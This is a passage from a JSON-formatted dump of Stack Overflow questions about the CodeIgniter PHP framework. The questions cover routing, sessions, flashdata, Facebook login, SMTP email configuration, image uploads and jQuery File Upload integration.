'&lt;li&gt;&lt;img src=\"&lt;?php echo base_url(); ?&gt;webroot/uploads/' + response + '\" /&gt;&lt;br /&gt;' + response + '&lt;/li&gt;';\n            $('#new-image-list').append(new_image);\n          } else {\n            var fail_message = '&lt;li&gt;Thumbnail creation failed for: ' + fileObj.name + '&lt;/li&gt;';\n            $('#new-image-list').append(fail_message);\n          }\n        },\n        error        : function(jqXHR, textStatus, errorThrown) {\n          alert('Error occurred when generating thumbnails.');\n        }\n      });\n    }\n  });\n});\n&lt;/script&gt;\n</code></pre>\n"},{"tags":["php","oracle","codeigniter","oracle11g"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":70,"score":1,"question_id":13193625,"title":"Database error on first load but not on refresh","body":"<p>When my web page first loads it displays my query and says Database Error. While refreshing the page loads successfully. Can anyone know why does this occurs?</p>\n\n<p>This issue is with my Production server not on Staging or Dev environment.</p>\n\n<p>This is the error message:</p>\n\n<blockquote>\n  <p>A Database Error Occurred</p>\n  \n  <p>Error Number:</p>\n  \n  <p>SELECT U.USER_ID, U.USER_NAME, U.NAME, U.DESIGNATION, U.EMAIL_ADDRESS,\n  A.CURR_ROLE_ID, A.ROLE_TYPE_ID FROM DOP_USERS U JOIN DOP_ACCESS A ON\n  U.USER_ID = A.USER_ID WHERE UPPER(U.USER_NAME) = 'BSNL.HO'</p>\n</blockquote>\n\n<p>I'm using PHP 5.1.1, Oracle 11G and Code Igniter 1.7</p>\n\n<blockquote>\n  <p>This issue occurs while there is no COOKIE value set in Browser...</p>\n</blockquote>\n"},{"tags":["facebook","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":187,"score":0,"question_id":7326049,"title":"How to install Facebook Ignited in a codeigniter app?","body":"<p>Trying to install <a href=\"https://github.com/Necromnius/Facebook-Ignited/\" rel=\"nofollow\">https://github.com/Necromnius/Facebook-Ignited/</a> into codeigniter.</p>\n\n<p>I'm new to the framework, how should I go about installing this, copying the files into\nmy project seems a bit heavy handed, is there another way?</p>\n"},{"tags":["php","facebook","api","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":78,"score":1,"question_id":12097804,"title":"FB_Ignited not returning $fb->me","body":"<p>I can get FB_Ignited to work with the demo provided, but whenever I try it from the landing page of my site, it: </p>\n\n<ol>\n<li>hits the Auth controller</li>\n<li>goes to FB</li>\n<li>comes back to the Auth controller and loads the 'start' view, while passing $content_data</li>\n</ol>\n\n<p>For some reason, on the start view, $this->fb_me isn't available.</p>\n\n<p>Here's my Auth controller - this is hit when the FB button is hit from the landing page</p>\n\n<pre><code>class Auth extends CI_Controller {\n\nfunction __construct()\n{\n    parent::__construct();      \n\n    $this-&gt;load-&gt;library('fb_ignited');\n    // The fb_ignited library is already auto-loaded so call the user and app.\n    $this-&gt;fb_me = $this-&gt;fb_ignited-&gt;fb_get_me();      \n    $this-&gt;fb_app = $this-&gt;fb_ignited-&gt;fb_get_app();\n\n    // This is a Request System I made to be used to work with Facebook Ignited.\n    // NOTE: This is not mandatory for the system to work.\n    if ($this-&gt;input-&gt;get('request_ids'))\n    {\n        $requests = $this-&gt;input-&gt;get('request_ids');\n        $this-&gt;request_result = $this-&gt;fb_ignited-&gt;fb_accept_requests($requests);\n    }\n}\n\nfunction index($type=\"\")\n{   \n    if (isset($this-&gt;request_result)) {\n        $content_data['error'] = $this-&gt;request_result;\n    } \n\n    if ($this-&gt;fb_me) {\n        $content_data['me'] = $this-&gt;fb_me;\n    } \n\n    $this-&gt;load-&gt;model('users');\n    $checkandadd = $this-&gt;users-&gt;checkandadd($this-&gt;fb_me);\n\n    $this-&gt;load-&gt;view('start', $content_data);\n}\n</code></pre>\n\n<p>}</p>\n\n<p>Not sure if it'll help, but here is what $this->facebook outputs (IDs and hashes intentionally tweaked):</p>\n\n<pre><code>Facebook Object\n(\n    [appId:protected] =&gt; 123456123456123456\n    [apiSecret:protected] =&gt; 123456123456123456\n    [user:protected] =&gt; 0\n    [signedRequest:protected] =&gt; \n    [state:protected] =&gt; 123456123456123456\n    [accessToken:protected] =&gt; 123456123456123456|123456123456123456\n    [fileUploadSupport:protected] =&gt; \n)\n</code></pre>\n\n<p>Some other notes:</p>\n\n<ul>\n<li><code>*RECURSION*</code> shows up a few times whenever I print_r($this->fb_ignited)</li>\n<li>Nothing shows up in the error logs</li>\n</ul>\n\n<p>Anyone encounter something like this before?</p>\n"},{"tags":["codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":27,"score":1,"question_id":13225556,"title":"How to get checkbox checked value from datagrid in codeigniter","body":"<p>I am new to codeigniter, i am simple datagrid with few columns.... what i want from grid is...i need get checked values from grid,....so i dont know how use foreach loop and get the values..</p>\n\n<p>can any one explain me with example plz....</p>\n\n<pre><code> foreach ($persons as $person)\n    {\n        $this-&gt;table-&gt;add_row(form_checkbox('att',$person-&gt;tab_classid), $person-&gt;tab_classid, $person-&gt;tab_classtitle, date('d-m-Y H:i',strtotime($person-&gt;tab_classtime)),$person-&gt;tab_pemail,anchor($person-&gt;tab_prsturl,'view','target=\"_new\"'),anchor($person-&gt;tab_recurl,'view','target=\"_new\"'),$person-&gt;tab_classduration,$person-&gt;tab_crtdate, \n        anchor('person/view/'.$person-&gt;tab_classid,'view',array('class'=&gt;'view')).' '.\n        anchor('person/update/'.$person-&gt;tab_classid,'update',array('class'=&gt;'update')).' '.\n        anchor('person/test/'.$person-&gt;tab_classid,'Attendee',array('class'=&gt;'attendee')).' '.\n        anchor('person/delete/'.$person-&gt;tab_classid,'delete',array('class'=&gt;'delete','onclick'=&gt;\"return confirm('Are you sure want to delete this person?')\"))\n        );\n    }\n    $data['table'] = $this-&gt;table-&gt;generate();\n</code></pre>\n"},{"tags":["codeigniter","routing","system","news"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":13147637,"title":"News system CodeIgniter","body":"<p>I try add example from <code>http://codeigniter.com/user_guide/tutorial/news_section.html</code></p>\n\n<p>to my site, this is code:</p>\n\n<p>news_model</p>\n\n<pre><code>&lt;?php\nclass News_model extends CI_Model {\n\n    public function __construct()\n    {\n        $this-&gt;load-&gt;database();\n    }\n\n\npublic function get_news($art = FALSE)\n{\n    if ($art === FALSE)\n    {\n        $query = $this-&gt;db-&gt;get('news');\n        return $query-&gt;result_array();\n    }\n\n    $query = $this-&gt;db-&gt;get_where('news', array('art' =&gt; $art));\n    return $query-&gt;row_array();\n}\n\npublic function set_news()\n{\n    $this-&gt;load-&gt;helper('url');\n\n    $slug = url_title($this-&gt;input-&gt;post('title'), 'dash', TRUE);\n\n    $data = array(\n        'title' =&gt; $this-&gt;input-&gt;post('title'),\n        'art' =&gt; $art,\n        'text' =&gt; $this-&gt;input-&gt;post('text'),\n        'image'=&gt; $image\n    );\n\n    return $this-&gt;db-&gt;insert('news', $data);\n  }\n}\n?&gt;\n</code></pre>\n\n<p>news_controller</p>\n\n<pre><code>&lt;?php\nclass News extends CI_Controller {\n\n    public function __construct()\n    {\n        parent::__construct();\n        $this-&gt;load-&gt;model('news_model');\n    }\n\n    public function index()\n    {\n        $session_data = $this-&gt;session-&gt;userdata('logged_in');\n        $data['username'] = $session_data['username'];\n        $data['errors_login'] = array();\n        $data['news'] = $this-&gt;news_model-&gt;get_news();\n        $data['title'] = 'News archive';\n\n    $this-&gt;load-&gt;view('main/open_news', $data);\n    }\n\n    public function view($art) {\n    $data['news_item'] = $this-&gt;news_model-&gt;get_news($art);\n\n    if (empty($data['news_item']))\n    {\n        show_404();\n    }\n\n    $data['title'] = $data['news_item']['title'];\n    $session_data = $this-&gt;session-&gt;userdata('logged_in');\n    $data['username'] = $session_data['username'];\n    $data['errors_login'] = array();\n    $this-&gt;load-&gt;view('main/open_one_news', $data);\n    }   \n}\n</code></pre>\n\n<p>open_news</p>\n\n<pre><code>&lt;?php\n$this-&gt;load-&gt;view('mains/header');\n$this-&gt;load-&gt;view('main/news');\n$this-&gt;load-&gt;view('mains/footer');\n?&gt;\n</code></pre>\n\n<p>news view</p>\n\n<pre><code>&lt;?php foreach ($news as $news_item): ?&gt;\n\n    &lt;h2&gt;&lt;?php echo $news_item['title'] ?&gt;&lt;/h2&gt;\n    &lt;div id=\"main\"&gt;\n        &lt;?php echo $news_item['text'] ?&gt;\n    &lt;/div&gt;\n    &lt;a href=\"news/&lt;?php $news_item['art'] ?&gt;\"&gt;View article&lt;/a&gt;\n&lt;?php endforeach ?&gt;\n</code></pre>\n\n<p>And when I click in <code>&lt;a href=\"news/&lt;?php $news_item['art'] ?&gt;\"&gt;View article&lt;/a&gt;</code> </p>\n\n<p>The page is not forwarding to concret page with news, only in link duplicate \"news\": </p>\n\n<pre><code>http://localhost/index.php/news/news/news/news/news/news\n</code></pre>\n\n<p>I dont know what is problem. But I think it will by may in routes.config\nBecause I have only:\n<code>$route['default_controller'] = 'login';</code> -> this is my start page</p>\n\n<p>But in CodeIgniter tutorial is: </p>\n\n<pre><code>$route['news/(:any)'] = 'news/view/$1';\n$route['news'] = 'news';\n$route['(:any)'] = 'pages/view/$1';\n$route['default_controller'] = 'pages/view';\n</code></pre>\n\n<p>But when I add some from 3 first line, even the first page with list of news doesn`t open.</p>\n\n<p>SOLVED:\nI make stupid mistake. Because controller name news, but function:  public function <code>view($art)</code>, and the link should be: <code>'news/view/'.$news_item['art']</code>.</p>\n"},{"tags":["php","jquery","json","codeigniter"],"answer_count":3,"favorite_count":1,"up_vote_count":2,"down_vote_count":1,"view_count":64,"score":1,"question_id":13213570,"title":"How do obfuscate JSON response when dealing with a DB query?","body":"<pre><code>[\n {\n  \"businesscards_id\":\"12\",\n  \"X_SIZE\":\"1.75x3\",\n  \"X_PAPER\":\"14ptGlossCoatedCoverwithUV(C2S)\",\n  \"X_COLOR\":\"1002\",\n  \"X_QTY\":\"250\",\n  \"O_RC\":\"NO\",\n  \"F_PRICE\":\"12490\",\n  \"UPS_GROUND\":\"12000\",\n  \"UPS_TWODAY\":\"24000\",\n  \"UPS_OVERNIGHT\":\"36000\"\n }\n]\n</code></pre>\n\n<p>This JSON encode response is seen in console of Chrome. This array is being returned from a DB query. It is showing my table column names. For security reasons I do not want to show my table column names. <strong>How can this JSON object be obfuscated or hashed and/or encoded or dynamically re-written to keep my table col names private?</strong></p>\n"},{"tags":["codeigniter","session","controller"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":13212192,"title":"Codeigniter Flashdata Is Not Showing","body":"<p>i have 2 page, which contains <code>delete</code> some record, check out the first controller to delete</p>\n\n<pre><code>function delete($idnya)\n{\n            $this-&gt;m_kategorimaterial-&gt;delete($idnya);\n            $this-&gt;session-&gt;set_flashdata('sukses','Hapus kategori material berhasil');\n            redirect('c_kategorimaterial');\n}\n</code></pre>\n\n<p>then loaded on view</p>\n\n<pre><code>&lt;div id=\"vkategorimaterial\"&gt;\n            &lt;p&gt;&lt;h2&gt;Menu Kategori Material&lt;/h2&gt;&lt;/p&gt;\n        &lt;center&gt;&lt;notif&gt;&lt;?php echo $this -&gt;session-&gt;flashdata('sukses'); ?&gt;&lt;/notif&gt;&lt;/center&gt;\n</code></pre>\n\n<p>and it works like i need. but then its not working on the other controller</p>\n\n<pre><code>function delete($idnya)\n{\n    $this-&gt;m_material-&gt;delete($idnya);\n    $this-&gt;session-&gt;set_flashdata('sukses','Hapus material berhasil');\n    redirect('c_material');\n}\n</code></pre>\n\n<p>and here is the views of <code>material</code> </p>\n\n<pre><code>&lt;div id=\"vmaterial\"&gt;\n            &lt;p&gt;&lt;h2&gt;Menu Material&lt;/h2&gt;&lt;/p&gt;\n    &lt;center&gt;&lt;notif&gt;&lt;?php echo $this-&gt;session-&gt;flashdata('sukses'); ?&gt;&lt;/notif&gt;&lt;/center&gt;\n</code></pre>\n\n<p>why does the flashdata is not showing on <code>material</code> page ? but it works on <code>kategorimaterial</code> page ? FYI, first, i make the</p>\n\n<pre><code>                $this-&gt;session-&gt;set_flashdata('sukses','Hapus kategori material berhasil');\n</code></pre>\n\n<p>on the <code>kategorimaterial</code> page, once it works, i copy the </p>\n\n<pre><code>                $this-&gt;session-&gt;set_flashdata('sukses','Hapus kategori material berhasil');\n</code></pre>\n\n<p>into <code>material</code> controller then change the value. and its not working. how do i resolve this ? </p>\n\n<p><code>&lt;notif&gt;</code> tag needed due to css styling <em>make green color on every flashdata message</em></p>\n"},{"tags":["php","codeigniter","core"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":13224673,"title":"Creating new core classes (not replacing)","body":"<p>Now I'm not the greatest Code Igniter person but I'm looking for a method to create other core classes. There is no purpose of my code extending the currently core and no use in creating it as a controller.</p>\n\n<p>Is there somewhere that is specified what is to be auto loaded?\nI started with a very basic file <code>Application/core/world.php</code>\n    \n\n<pre><code>Class CI_Worlds{\n\n    function __construct(){\n        die('this is the end of the world');\n    }\n}\n\n?&gt;\n</code></pre>\n\n<p>Trying to access it with <code>$this-&gt;load-&gt;library('Worlds');</code>\nHave also tried other alternatives for the class name.</p>\n"},{"tags":["ajax","api","codeigniter","session"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":13222169,"title":"where should i set the session api and client","body":"<p>Here is the situation, I have setup 2 codeigniter installation.</p>\n\n<p>One will be a client and one will be an api. Further improvement of this will be</p>\n\n<ol>\n<li>The client will no longer be made from CI, since I wasn't using it's functionality. I just wanted to start out from a mvc framework right on.</li>\n</ol>\n\n<p>My question would be where should I be storing sessions? during logins.</p>\n\n<p>Below is how I did it, but I think I did it wrong.</p>\n\n<ol>\n<li>I created a Login from the <strong>client</strong>. This one sends the login credentials to the <strong>api</strong> and then validated these information sent by the <strong>client</strong> and will return a <em>message/response</em> whethere the login credentials were valid or not.</li>\n</ol>\n\n<p>If the login details were valid, the <strong>api</strong> will set a session in it's controller like this</p>\n\n<pre><code>if(true) {\n    $this-&gt;session-&gt;set_userdata($array);\n}\n</code></pre>\n\n<p>This is in the <code>login_controller</code> I created. Is this the proper way of setting sessions for a <strong>client</strong> of a api? </p>\n"},{"tags":["facebook","codeigniter"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":46,"score":2,"question_id":13219839,"title":"Facebook login with Codeigniter stopped working suddenly","body":"<p>I am using Facebook with Codeigniter and was working fine \nbut suddenly stopped working, is facebook changed anything </p>\n\n<p>the facebook function </p>\n\n<pre><code>public function takofacebook($page = TRUE, $name = TRUE) {\n\n    if (isset($page) and (($page != TRUE) or ($page != 1)) and isset($name)) {\n        $data['page'] = $page;\n        $data['name'] = $name;\n    }\n\n    $this -&gt; load -&gt; library('fb');\n    if (!$this -&gt; fb -&gt; is_connected()) {\n        redirect($this -&gt; fb -&gt; login_url(current_url()));\n    }\n\n    $fb_user = $this -&gt; fb -&gt; client -&gt; api('/me');\n\n    if (empty($fb_user)) {\n        $error = \"FACEBOOK LOGIN FAILED - USER US EMPTY. FILE: \" . __FILE__ . \" LINE: \" . __LINE__;\n        $this -&gt; session -&gt; set_flashdata('register_error', $error);\n    } else {\n        $this -&gt; user -&gt; set_facebook_id($fb_user['id']);\n        $user = $this -&gt; user -&gt; get_by_facebook();\n        if (!empty($user) &amp;&amp; !empty($user -&gt; id) &amp;&amp; is_numeric($user -&gt; id)) {\n\n            //TODO: Make things a bit more secure here\n            //Login &amp; Redirect home\n\n            $this -&gt; _login($user -&gt; id, 'facebook');\n            $this -&gt; load -&gt; view('users/redirect_home2', $data);\n            return;\n        }\n    }\n    //Go to the registeration page\n    $this -&gt; load -&gt; view('users/redirect2', array('method' =&gt; 'facebook'));\n}\n\n/**\n * Logs user in with facebook\n */\n\n //tako facebook\npublic function zangafacebook() {\n\n\n\n    $this -&gt; load -&gt; library('fb');\n    if (!$this -&gt; fb -&gt; is_connected()) {\n        redirect($this -&gt; fb -&gt; login_url(current_url()));\n    }\n\n    $fb_user = $this -&gt; fb -&gt; client -&gt; api('/me');\n\n    if (empty($fb_user)) {\n        $error = \"FACEBOOK LOGIN FAILED - USER US EMPTY. FILE: \" . __FILE__ . \" LINE: \" . __LINE__;\n        $this -&gt; session -&gt; set_flashdata('register_error', $error);\n    } else {\n        $this -&gt; user -&gt; set_facebook_id($fb_user['id']);\n        $user = $this -&gt; user -&gt; get_by_facebook();\n        if (!empty($user) &amp;&amp; !empty($user -&gt; id) &amp;&amp; is_numeric($user -&gt; id)) {\n\n            //TODO: Make things a bit more secure here\n            //Login &amp; Redirect home\n\n            $this -&gt; _login($user -&gt; id, 'facebook');\n            $this -&gt; load -&gt; view('users/redirect_home3');\n            return;\n        }\n    }\n    //Go to the registeration page\n    $this -&gt; load -&gt; view('users/redirect3', array('method' =&gt; 'facebook'));\n}\n</code></pre>\n"},{"tags":["php","codeigniter","model","abstract"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":244,"score":0,"question_id":11193296,"title":"Codeigniter abstract base model","body":"<p>Is it possible to implement an abstract base model in Codeigniter? I have created a abstract class which has basic CRUD functionalities but I am receiving a \"Cannot instantiate abstract class\" error. </p>\n\n<p>The abstract model is located in /application/core/my_model.php and is simply</p>\n\n<pre><code>abstract class MY_Model extends CI_Model\n{\n</code></pre>\n\n<p>The Cannot instantiate abstract class\" is on line 174 of /system/core/Common.php</p>\n\n<p>It looks like Codeigniter is trying to instantiate my_model.php when it loads which I'm guessing is due to files in the /core folder being used as a place to extend core system files such as Controller and Model. Is there any way to stop this? I was trying to autoload the model using <a href=\"http://philsturgeon.co.uk/blog/2010/02/CodeIgniter-base-Classes-Keeping-it-DRY\" rel=\"nofollow\">Phil Sturgeon's native autoload</a> but it hasn't helped.</p>\n\n<pre><code>/*\n| -------------------------------------------------------------------\n|  Native Auto-load\n| -------------------------------------------------------------------\n| \n| Nothing to do with cnfig/autoload.php, this allows PHP autoload to work\n| for base controllers and some third-party libraries.\n|\n*/\n\nfunction __autoload($class)\n{\n    if(strpos($class, 'CI_') !== 0)\n    {\n        @include_once( APPPATH . 'core/'. $class . EXT );\n    }\n}\n</code></pre>\n\n<p>I realise an easy way to do this would to just be to include the file at the top of every model I wanted to use it in but obviously this would be less than optimal.</p>\n"},{"tags":["php","url","codeigniter"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":184,"score":0,"question_id":5548349,"title":"Where is this underscore coming from? I can only assume magic","body":"<p>I have the following test case controller setup in a codeigniter framework:</p>\n\n<pre><code>class Test extends Controller {\n    public function Test()\n    {\n        parent::Controller();\n    }\n\n    public function index($bla = ''){\n        echo $this-&gt;uri-&gt;segment(3) . '&lt;br/&gt;';\n        echo $bla . '&lt;br/&gt;';\n\n        $url = site_url('test') . '/index/' . rawurlencode('foo bar') . '/';\n\n        echo \"&lt;a href=\\\"$url\\\"&gt;click me&lt;/a&gt;\";\n    }\n\n}\n</code></pre>\n\n<p>I would like <code>$bla</code> to echo 'foo bar', not 'foo_bar'. Regardless if I use rawurlencode, urlencode, or nothing at all, there is a '_' being inserted for the space character. I have confirmed the href for the anchor does include the %20 sign, so I don't understand why the string is being altered. </p>\n\n<p>I have included two screen shots to illustrate the point, the first image shows when no argument is passed to the controller, the second is with the 'foo bar' passed to it. I just don't understand why 'foo%20bar' would be altered?</p>\n\n<p><img src=\"http://i.stack.imgur.com/eY6Es.png\" alt=\"enter image description here\"></p>\n\n<p><img src=\"http://i.stack.imgur.com/aNsZl.png\" alt=\"enter image description here\"></p>\n"},{"tags":["php","forms","codeigniter","form-submit"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":13222182,"title":"Getting simple if/else condition to work upon submit","body":"<p>I have tried many different things including adding              <code>$this-&gt;load-&gt;helper(array('form', 'url'));</code> to autoload.php, among other things. </p>\n\n<p>When I fill out a value for first name and last name and nothing else and press submit, it just redirects back to the same page (not to clientRegistrationSuccess.php) as specified in the <code>if{} else{}</code></p>\n\n<p><strong>Form (View)</strong></p>\n\n<pre><code> echo validation_errors();\n\n       echo form_open('index/pages/clientcreation',$CustCreationFormAttr);\n        echo form_label('First Name: ','fname');\n            echo form_input($CustCreationFirstName);echo '&lt;br&gt;';\n        echo form_label('Last Name: ','lname');\n            echo form_input($CustCreationLastName);echo '&lt;br&gt;';\n        echo form_label('Title: ', 'title');\n            echo form_input($CustCreationClientTitle);echo '&lt;br&gt;';\n        echo form_label('Company: ', 'co');\n            echo form_input($CustCreationCompany);echo '&lt;br&gt;';\n        echo form_label('Email: ','email');\n            echo form_input($CustCreationEmail);echo '&lt;br&gt;';\n            echo form_submit($CustCreationSubmit,'Submit'); \n</code></pre>\n\n<p><strong>Controller</strong></p>\n\n<pre><code>class Clientcreation extends CI_Controller\n    {   \n        function index(){\n            ####################################\n            $this-&gt;load-&gt;view('navigation');\n            $this-&gt;load-&gt;view('pages/clientcreation');\n            $this-&gt;load-&gt;view('footer');   \n\n            ####################################\n            $this-&gt;load-&gt;helper(array('form', 'url'));\n            $this-&gt;load-&gt;library( array('form_validation') );\n\n            ## Set Validation\n            $this-&gt;form_validation-&gt;set_rules('fname', 'First Name', 'required');\n        $this-&gt;form_validation-&gt;set_rules('lname', 'Last Name', 'required');\n\n            ## Perform Validation\n            if ($this-&gt;form_validation-&gt;run() == FALSE){\n                $this-&gt;load-&gt;view('pages/clientcreation');\n            }\n        else{\n                $this-&gt;load-&gt;view('pages/success/clientRegistrationSuccess');\n        }\n        } \n\n    }\n</code></pre>\n\n<p>Additionally, the form is loading as intended... like:\n<img src=\"http://i.stack.imgur.com/O4rOV.png\" alt=\"img1\"></p>\n\n<p>The paths match up too, because if I change <code>$this-&gt;load-&gt;view('pages/clientcreation');</code> to <code>$this-&gt;load-&gt;view('pages/hi');</code> it is calling this view. What am I doing wrong here?</p>\n"},{"tags":["php","css","codeigniter"],"answer_count":3,"favorite_count":3,"up_vote_count":3,"down_vote_count":0,"view_count":609,"score":3,"question_id":9458484,"title":"How do you organize your structure in CodeIgniter?","body":"<p>I will be building a CMS for my final Web Development course project, and i've been challenged by my teacher creating it in an MVC system, and for now, I'll be using CodeIgniter.</p>\n\n<p>Therefore, I would like to know how do you organize your file / folder structure.</p>\n\n<p>I will be using a simple templating system:\n- For now I have a templates.php config file that is being autoloaded and says the name of the selected template, and the absolute path to it.\n- The templates folder is inside the views folder (is this the most correct way to do this?)\n- Right now I am having some problem to access .css files through the files in the view, and, from what I've read people usually put all that files outside the application folder.</p>\n\n<p>How do you normally do it? And, as seeing what I am building, what advices can you give me?\nShouldn't views contain all the stuff from templates? (including CSS inside the folder of templates)</p>\n\n<p>Thanks.</p>\n\n<p><em>(i'm using the Code Ignitor 2.1.0)</em></p>\n\n<p>EDIT:</p>\n\n<p>Right now, after structured all the files and folders, I am in a dilemma. I have added the following in constants.php</p>\n\n<pre><code>&lt;!-- language: lang-php --&gt;\n$config['selected_template'] = 'oceania';\n$config['template_abs_path'] = 'assets/templates/'.$config['selected_template'];\n\ndefine('IMAGES_PATH', $config['template_abs_path'].'/img/' );\ndefine('CSS_PATH', $config['template_abs_path'].'/css/' );\ndefine('SCRIPTS_PATH', $config['template_abs_path'].'/js/' );\n</code></pre>\n\n<p>(if I didn't define the selected_template and template_abs_path I could play with them in the constants)</p>\n\n<p>And i'm including them in the HTML like this:</p>\n\n<pre><code>&lt;!-- language: lang-html --&gt;\n&lt;link rel=\"stylesheet\" type=\"text/css\" href=\"&lt;?=CSS_PATH;?&gt;style.css\" /&gt;\n</code></pre>\n\n<p>But now, I was trying to get a title stored in config too, but I can't do it, because I need all this variables to be in the other templates.php file that I had created previously, otherwise it will not recognize my variables. (I have templates autoloading)</p>\n\n<p>templates.php</p>\n\n<pre><code>&lt;!-- language: lang-php --&gt;\n&lt;?php  if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\n$config['title'] = 'Title of the website';\n$config['selected_template'] = 'oceania';\n$config['template_abs_path'] = 'templates/'.$config['selected_template'];\n</code></pre>\n\n<p>header.php</p>\n\n<pre><code>&lt;div id=\"logo\"&gt;\n&lt;h1&gt;&lt;a href=\"#\"&gt;&lt;?=$this-&gt;config-&gt;item('title');?&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;/div&gt;\n</code></pre>\n\n<p>Therefore, do I need to have both config to have it working on my website? It really doesn't make much sense for me...</p>\n"},{"tags":["php","codeigniter","email","godaddy"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":13219209,"title":"Codeigniter email class with Godaddy email hosting Issues","body":"<p>I bought email accounts for my domain from godaddy. I am using Codeigniter to send emails from my domain email account. I created the config file email.php where i put the config preferences:</p>\n\n<pre><code>$config['protocol'] = \"smtp\";\n$config['smtp_host'] = \"smtpout.asia.secureserver.net\";\n$config['smtp_user'] = \"*****\";\n$config['smtp_pass'] = \"*****\";\n$config['smtp_port'] = \"25\";\n$config['mailtype'] = \"text\";\n$config['validate'] = \"TRUE\";\n</code></pre>\n\n<p>I got the smtp_host host name \"smtpout.asia.secureserver.net\" from godaddy after registration ( i also tried using relay-hosting.secureserver.net for the host but it didnt work).</p>\n\n<p>In my controller, i made sure the \"to \" part was the same as my domain email address.</p>\n\n<p>This did not work, it resulted in an error:</p>\n\n<pre><code> Message: fsockopen(): unable to connect to smtpout.asia.secureserver.net:25 (A connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond. )\n</code></pre>\n\n<p>Along with 10 more php errors, and below them it says:</p>\n\n<pre><code>The following SMTP error was encountered: 10060 A connection attempt failed because the      connected party did not properly respond after a period of time, or established connection        failed because connected host has failed to respond. \n</code></pre>\n\n<p>Unable to send data: AUTH LOGIN\nFailed to send AUTH LOGIN command.</p>\n\n<p>My php.ini file has :</p>\n\n<pre><code>; XAMPP: Comment out this if you want to work with an SMTP Server like Mercury\n; SMTP = localhost\n; smtp_port = 25\n</code></pre>\n\n<p>Now i realize these are commented out ( do i need to uncomment them? if yes, what should be the values ). I did not uncomment because I thought the codeigniter config settings will override these.</p>\n\n<p>Any help? thanks.</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":30,"score":2,"question_id":13218842,"title":"codeigniter image update","body":"<p>I'm stuck on a problem with image uploader. I've created the image uploader which works fine but I also need to edit them. \nWhen I add a need image the db column updates correctly but I if don't change the image and leave it as it is, I get an error <i>\"Column 'image' cannot be null\"</i></p>\n\n<p>This is the code for the update section:</p>\n\n<pre><code>else if ($type == 'update')\n{\n\n    if($this-&gt;input-&gt;post('image')) {\n        $fdata = $this-&gt;savenew();\n        $data['image'] = $fdata['upload_data']['file_name'];\n\n    } else {\n         $data['image'] = $this-&gt;input-&gt;post('current_image');\n\n\n    }\n\n    $return = $this-&gt;add_radio_model-&gt;update($id, $data);\n}\n</code></pre>\n\n<p>Sorry if I wasn't very explicit</p>\n\n<p>EDIT:</p>\n\n<pre><code>     private function savenew(){                \n\n     $config['upload_path'] = './assets/'; //Make SURE that you chmod this directory to 777!\n     $config['allowed_types'] = 'gif|jpg|png';\n     $config['max_size']    = '0'; // 0 = no limit on file size (this also depends on your PHP configuration)\n     $config['remove_spaces']=TRUE; //Remove spaces from the file name\n\n     $this-&gt;load-&gt;library('upload', $config);\n\n    if ( ! $this-&gt;upload-&gt;do_upload('image'))\n    {\n            $data['error']= array('error' =&gt; $this-&gt;upload-&gt;display_errors());\n            log_message('error',$data['error']);\n            }\n            else\n                {\n                $data = array('upload_data' =&gt; $this-&gt;upload-&gt;data());\n\n                }\n        return $data;\n    }\n</code></pre>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":13219300,"title":"What if a view is an empty value while loading it in codeigniter?","body":"<p>I am building an application which requires loading view dynamically. The value of view is a variable and it depends on what the controller sets it. Sometimes my value is returned as empty or null value, that is I don't want any view to load. But then my code breaks at the same place and half of the screen goes blank. Is there any workaround for this?</p>\n"},{"tags":["jquery","file","codeigniter","upload","blueimp"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":120,"score":0,"question_id":13179738,"title":"blueimp/jQuery-File-Upload with Codeigniter 2.1","body":"<p>Im tryign to install the <a href=\"https://github.com/blueimp/jQuery-File-Upload/wiki/jQuery-File-Upload-6.5-with-CodeIgniter-2.1\" rel=\"nofollow\">jQuery File Upload 6.5 with CodeIgniter 2.1</a> into my Codeigniter script and Im facing some problems.</p>\n\n<p>At first Im using 2.1.3 CI version with \"Modular Extensions - HMVC(version 5.4)\" as third_party into my application folder.</p>\n\n<p>I want to create a module \"upload\" by using the blueimp/jQuery-File-Upload. I have followed the instruductions as described there but nothing works.</p>\n\n<p>The problem is that I'm getting in developer console the errors:</p>\n\n<pre><code>Uncaught TypeError: Cannot read property 'length' of null      main.js:31\nPOST url/upload/upload_img 500 (Internal Server Error)     jquery.js:8416\n</code></pre>\n\n<p>*The 500 error showed when Im starting the upload. The truth is that upload_img url has never opened.*</p>\n\n<p>Here is my code:</p>\n\n<p><strong>application/config/constants.php</strong></p>\n\n<pre><code>&lt;?php  if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\ndefine('FOPEN_READ',                            'rb');\ndefine('FOPEN_READ_WRITE',                      'r+b');\ndefine('FOPEN_WRITE_CREATE_DESTRUCTIVE',        'wb'); // truncates existing file data, use with care\ndefine('FOPEN_READ_WRITE_CREATE_DESTRUCTIVE',   'w+b'); // truncates existing file data, use with 